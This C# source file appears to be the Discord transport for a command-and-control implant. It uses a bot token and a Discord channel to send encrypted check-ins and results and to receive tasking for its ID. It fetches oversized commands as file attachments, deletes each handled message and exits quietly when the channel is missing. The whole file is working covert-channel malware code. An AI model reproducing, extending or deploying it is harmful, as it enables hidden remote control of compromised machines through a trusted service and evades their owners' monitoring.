using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using Discord;
using Discord.WebSocket;
using Newtonsoft.Json;
using System.Net.Http;

namespace Agent.Profiles
{
    public class DiscordProfile : IProfile
    {
        private IAgentConfig agentConfig { get; set; }
        private ICryptoManager crypt { get; set; }
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private ManualResetEventSlim checkinAvailable = new ManualResetEventSlim(false);
        private static readonly TimeSpan CheckinResponseTimeout = TimeSpan.FromSeconds(30);
        private ManualResetEventSlim clientReady = new ManualResetEventSlim(false);
        private Func<Task> startClient;
        private Func<Task> loginClient;
        private Func<LoginState> getLoginState;
        private TimeSpan connectionTimeout = TimeSpan.FromSeconds(30);
        private readonly string _token;
        private readonly ulong _channel_id;
        private readonly string _uuid = Guid.NewGuid().ToString();
        private ITextChannel _channel { get; set; }
        private readonly DiscordSocketClient _client;
        private readonly HttpClient _httpClient;
        private CheckinResponse cir;

        private bool checkedin = false;
        private bool connected = false;
        private int currentAttempt = 0;
        private int maxAttempts = 10;

        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;

        private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
        public DiscordProfile(IAgentConfig config, ICryptoManager crypto, ILogger logger, IMessageManager messageManager)
        {
            this.crypt = crypto;
            this.agentConfig = config;
            this.logger = logger;
            this.messageManager = messageManager;
            var opts = System.Text.Json.JsonSerializer.Deserialize(
                ChannelConfig.Decode(),
                DiscordChannelOptionsJsonContext.Default.DiscordChannelOptions)
                ?? throw new InvalidOperationException("Invalid Discord profile configuration");
            _token = opts.DiscordToken;
            _channel_id = ulong.Parse(opts.BotChannel);

            var gateway_config = new DiscordSocketConfig()
            {
                GatewayIntents = GatewayIntents.AllUnprivileged | GatewayIntents.MessageContent
            };
            _httpClient = new HttpClient();
            _client = new DiscordSocketClient(gateway_config);
            startClient = () => _client.StartAsync();
            loginClient = () => _client.LoginAsync(TokenType.Bot, _token);
            getLoginState = () => _client.LoginState;
            _client.MessageReceived += _client_MessageReceived;
            _client.Ready += _client_Ready;
        }

        private async Task _client_Ready()
        {
            _channel = (ITextChannel)_client.GetChannel(_channel_id);

            if (_channel is null)
            {
                Environment.Exit(0);
            }
            clientReady.Set();
        }

        private async Task _client_MessageReceived(SocketMessage message)
        {
            if (message is null)
            {
                return;
            }

            try
            {
                var attachment = message.Attachments.FirstOrDefault();
                string content = attachment?.Filename?.Contains(_uuid) == true
                    ? await GetFileContentsAsync(attachment.Url)
                    : message.Content;

                if (HandleInboundMessage(content))
                {
                    try
                    {
                        _ = message.DeleteAsync();
                    }
                    catch { }
                }
            }
            catch
            {
                // A malformed peer message must not fault Discord's receive callback.
            }
        }

        private bool HandleInboundMessage(string content)
        {
            MessageWrapper? discordMessage;
            try
            {
                discordMessage = JsonConvert.DeserializeObject<MessageWrapper>(content);
            }
            catch
            {
                return false;
            }

            if (discordMessage is null || discordMessage.to_server || discordMessage.client_id != _uuid)
            {
                return false;
            }

            try
            {
                string plaintext = this.crypt.Decrypt(discordMessage.message);
                if (!checkedin)
                {
                    CheckinResponse? response = System.Text.Json.JsonSerializer.Deserialize(plaintext, CheckinResponseJsonContext.Default.CheckinResponse);
                    if (!CheckinResponseValidation.IsSuccessful(response))
                    {
                        return true;
                    }

                    cir = response;
                    checkinAvailable.Set();
                    return true;
                }

                //If we make it to here, it's a tasking response
                GetTaskingResponse? gtr = System.Text.Json.JsonSerializer.Deserialize(plaintext, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                if (gtr?.action != "get_tasking")
                {
                    return true;
                }

                TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
                this.SetTaskingReceived?.Invoke(this, tra);
            }
            catch
            {
                // JSON, Base64, crypto, and tasking failures are peer-controlled.
            }

            return true;
        }

        private async Task<bool> Start()
        {
            clientReady.Reset();
            if (!await WaitForConnectionStep(startClient(), connectionTimeout, cancellationTokenSource.Token) ||
                !await WaitForConnectionStep(loginClient(), connectionTimeout, cancellationTokenSource.Token) ||
                !await CheckinResponseWait.WaitAsync(clientReady, connectionTimeout, cancellationTokenSource.Token))
            {
                return false;
            }
            return getLoginState() == LoginState.LoggedIn;
        }

        private static async Task<bool> WaitForConnectionStep(Task operation, TimeSpan timeout, CancellationToken cancellationToken)
        {
            try
            {
                await operation.WaitAsync(timeout, cancellationToken);
                return true;
            }
            catch (TimeoutException)
            {
                ObserveFault(operation);
                return false;
            }
            catch (OperationCanceledException)
            {
                ObserveFault(operation);
                throw;
            }
        }

        private static void ObserveFault(Task operation) =>
            _ = operation.ContinueWith(
                task => _ = task.Exception,
                CancellationToken.None,
                TaskContinuationOptions.OnlyOnFaulted | TaskContinuationOptions.ExecuteSynchronously,
                TaskScheduler.Default);

        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            //Write our checkin message to the pipe

            await this.Send(System.Text.Json.JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));

            //Wait for a bounded interval for a checkin response message.
            if (!await WaitForCheckinResponse(checkinAvailable, CheckinResponseTimeout, cancellationTokenSource.Token))
            {
                return new CheckinResponse { status = "failed" };
            }

            //We got a checkin response, so let's finish the checkin process
            this.checkedin = true;

            return this.cir;
        }

        private static Task<bool> WaitForCheckinResponse(
            ManualResetEventSlim signal,
            TimeSpan timeout,
            CancellationToken cancellationToken) =>
            CheckinResponseWait.WaitAsync(signal, timeout, cancellationToken);

        public async Task StartBeacon()
        {
            //Main beacon loop handled here
            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                if (getLoginState() != LoginState.LoggedIn)
                {
                    if (!await this.Start())
                    {
                        this.currentAttempt++;
                        if (this.currentAttempt >= this.maxAttempts)
                        {
                            this.cancellationTokenSource.Cancel();
                        }
                        continue;
                    }
                }

                //Check if we have something to send.
                if (!this.messageManager.HasResponses())
                {
                    try
                    {
                        await WaitWhileIdle(cancellationTokenSource.Token);
                    }
                    catch (OperationCanceledException) when (cancellationTokenSource.IsCancellationRequested)
                    {
                        break;
                    }
                    continue;
                }

                try
                {
                    bool delivered = await messageManager.DeliverAsync(
                        this.Send,
                        result => result);
                    this.currentAttempt = delivered ? 0 : this.currentAttempt + 1;
                }
                catch (Exception e)
                {
                    this.currentAttempt++;
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    this.cancellationTokenSource.Cancel();
                }
            }
        }

        private static Task WaitWhileIdle(CancellationToken cancellationToken)
        {
            return Task.Delay(100, cancellationToken);
        }

        internal async Task<bool> Send(string json)
        {
            if (getLoginState() != LoginState.LoggedIn)
            {
                if (!await this.Start())
                {
                    return false;
                }
            }

            string msg = this.crypt.Encrypt(json);
            MessageWrapper discordMessage = new MessageWrapper()
            {
                to_server = true,
                sender_id = _uuid,
                message = msg,
                client_id = "",
            };

            if (_channel is null)
            {
                _channel = (ITextChannel)_client.GetChannel(_channel_id);
            }

            if (json.Length > 1950)
            {
                using (MemoryStream stream = new MemoryStream(System.Text.Encoding.ASCII.GetBytes(System.Text.Json.JsonSerializer.Serialize(discordMessage))))
                {
                    await _channel.SendFileAsync(stream, discordMessage.client_id + ".server");
                }
            }
            else
            {
                await _channel.SendMessageAsync(System.Text.Json.JsonSerializer.Serialize(discordMessage));
            }

            return true;
        }

        public bool StopBeacon()
        {
            this.cancellationTokenSource.Cancel();
            return true;
        }
        private async Task<string> GetFileContentsAsync(string url)
        {
            string message = String.Empty;
            try
            {
                using (HttpResponseMessage response = await _httpClient.GetAsync(url))
                {
                    using (HttpContent content = response.Content)
                    {
                        message = await content.ReadAsStringAsync();
                    }
                }
            }
            catch { }
            return await Unescape(message) ?? "";
        }
        private async Task<string> Unescape(string message)
        {
            return message.TrimStart('"').TrimEnd('"').Replace("\\\"", "\"");

        }
    }
}
